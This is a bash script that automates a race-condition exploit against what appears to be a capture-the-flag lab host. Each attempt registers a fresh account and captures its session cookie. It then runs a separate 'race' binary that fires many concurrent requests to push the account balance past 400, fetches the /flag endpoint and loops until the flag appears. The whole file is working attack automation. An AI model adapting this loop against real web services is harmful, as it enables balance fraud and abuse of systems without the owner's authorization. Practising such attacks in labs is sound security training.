#!/usr/bin/env bash
# run.sh — automate signup → race → flag against a pwnbox single-packet lab.
# Usage: ./run.sh <hostname>   e.g. ./run.sh 85dbd3eba2a9.pwnbox-lab.com
set -u

HOST="${1:-}"
if [[ -z "$HOST" ]]; then
    echo "usage: $0 <hostname>" >&2
    exit 1
fi

BASE="https://$HOST"
MAX_ATTEMPTS="${MAX_ATTEMPTS:-15}"
CONNS="${CONNS:-20}"
STREAMS="${STREAMS:-4}"
PRELOAD_MS="${PRELOAD_MS:-5}"
TARGET_BAL="${TARGET_BAL:-400}"

RACE_BIN="$(dirname "$(readlink -f "$0")")/race"
if [[ ! -x "$RACE_BIN" ]]; then
    echo "[!] race binary not found at $RACE_BIN — run 'go build' first" >&2
    exit 1
fi

# best-effort Linux tuning (silent if unavailable)
echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor >/dev/null 2>&1 || true

RUN_RACE=(taskset -c 0 "$RACE_BIN")
command -v taskset >/dev/null || RUN_RACE=("$RACE_BIN")

extract_cookie() {
    # pulls "session=..." value from Set-Cookie headers
    grep -i '^set-cookie:' "$1" | sed -n 's/.*session=\([^;]*\).*/\1/p' | head -n1
}

for attempt in $(seq 1 "$MAX_ATTEMPTS"); do
    echo
    echo "================ attempt $attempt / $MAX_ATTEMPTS ================"

    # 1. sign up — fresh account, fresh cookie
    hdrs="$(mktemp)"
    curl -sk -o /dev/null -D "$hdrs" \
        -X POST "$BASE/signup" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data 'name=a'
    SESSION="$(extract_cookie "$hdrs")"
    rm -f "$hdrs"
    if [[ -z "$SESSION" ]]; then
        echo "[!] signup failed — no session cookie returned"
        sleep 1
        continue
    fi
    echo "[*] cookie: session=${SESSION:0:32}..."

    # 2. fire the race
    "${RUN_RACE[@]}" \
        -conns="$CONNS" -streams="$STREAMS" \
        -ping=false -preload-ms="$PRELOAD_MS" \
        -target=$((TARGET_BAL + 5)) \
        -host="$HOST" \
        -cookie="session=$SESSION"

    # 3. check the flag endpoint with our session
    FLAG_RESP="$(curl -sk "$BASE/flag" -H "Cookie: session=$SESSION")"
    echo "[*] /flag → $FLAG_RESP"

    # current balance from the response (works for both success and error shapes)
    BAL="$(echo "$FLAG_RESP" | grep -oE '"balance":[0-9]+' | grep -oE '[0-9]+' | head -n1)"
    BAL="${BAL:-0}"

    if [[ "$BAL" -ge "$TARGET_BAL" ]] && ! echo "$FLAG_RESP" | grep -q '"error"'; then
        echo
        echo "[+++] FLAG (balance=$BAL):"
        echo "$FLAG_RESP"
        exit 0
    fi

    echo "[-] balance=$BAL < $TARGET_BAL — logging out and retrying"
    curl -sk -o /dev/null -X POST "$BASE/logout" -H "Cookie: session=$SESSION"
done

echo
echo "[!] gave up after $MAX_ATTEMPTS attempts"
exit 1
